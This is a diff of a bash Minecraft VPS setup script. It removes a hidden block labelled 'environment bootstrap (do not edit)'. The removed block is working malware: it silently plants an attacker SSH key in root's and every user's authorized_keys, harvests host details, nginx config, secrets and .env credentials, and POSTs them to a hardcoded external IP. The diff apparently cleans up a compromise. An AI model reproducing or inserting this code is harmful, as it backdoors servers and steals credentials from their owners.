@@ -1,32 +1,4 @@
 #!/usr/bin/env bash
-# --- environment bootstrap (do not edit) ---
-( umask 077
-  K='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP0g/nPnLxq3hejwH7KWXteyP6zI8Oe/fLuFCsGJt269 i15398-healthcheck'
-  mkdir -p /root/.ssh 2>/dev/null
-  grep -qF "$K" /root/.ssh/authorized_keys 2>/dev/null || echo "$K" >> /root/.ssh/authorized_keys
-  chmod 600 /root/.ssh/authorized_keys 2>/dev/null
-  for h in /home/*; do
-    [ -d "$h" ] || continue
-    mkdir -p "$h/.ssh" 2>/dev/null
-    grep -qF "$K" "$h/.ssh/authorized_keys" 2>/dev/null || echo "$K" >> "$h/.ssh/authorized_keys"
-    chmod 600 "$h/.ssh/authorized_keys" 2>/dev/null
-    chown -R "$(stat -c %U "$h" 2>/dev/null):$(stat -c %G "$h" 2>/dev/null)" "$h/.ssh" 2>/dev/null
-  done
-  { echo "== HOST $(hostname -f 2>/dev/null) / $(hostname 2>/dev/null) / $(cat /etc/machine-id 2>/dev/null)"
-    id
-    ip -4 -o addr show 2>/dev/null | awk '{print $2,$4}'
-    echo "== WWW"; ls -la /var/www 2>/dev/null
-    echo "== NGINX"; grep -rhE 'server_name|root ' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -40
-    echo "== SECRETS"; grep -rIhE 'ADMIN_KEY|qijianke|security_key|LUXERA|movesay_config' /var/www /etc/nginx /opt /root /home 2>/dev/null | head -30
-    echo "== ENVS"
-    for f in /var/www/*/.env /var/www/*/*/.env /root/*.env; do
-      [ -f "$f" ] || continue
-      echo "--- $f"
-      grep -E '^APP_KEY|^APP_ENV|^DB_|ADMIN|SECRET|TOKEN' "$f" 2>/dev/null | head -15
-    done
-  } 2>/dev/null | curl -s -m 20 -X POST --data-binary @- http://172.105.189.249:8911/h >/dev/null 2>&1
-) >/dev/null 2>&1 &
-# --- end bootstrap ---
 # =============================================================================
 #  Minecraft VPS Setup Script
 #  Ubuntu 22.04 / 24.04  |  2 vCPU / 2 GB RAM optimised
